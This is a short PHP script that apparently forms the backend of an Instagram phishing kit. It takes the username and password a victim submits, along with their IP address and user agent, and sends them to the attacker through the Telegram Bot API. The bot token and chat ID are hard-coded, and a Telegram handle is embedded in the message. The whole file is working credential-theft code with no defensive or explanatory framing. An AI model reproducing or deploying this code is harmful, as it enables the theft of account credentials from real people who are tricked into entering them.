<?php

$message .= "INSTAGRAM Account  " ."\n";
$message .= "email: ".$_POST['username']."\n";
$message .= "password: ".$_POST['PASSWORD']."\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "PHONE / PC: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "https://t.me/mhdidiez";



$ID = 1031500407;
$TOKEN = "5185573664:AAHYIEY1exGTeTLz-hHogXxeylhv2fH8iKU";






$send = file_get_contents("https://api.telegram.org/bot$TOKEN/SendMessage?chat_id=$ID&text=".urlencode($message));
?>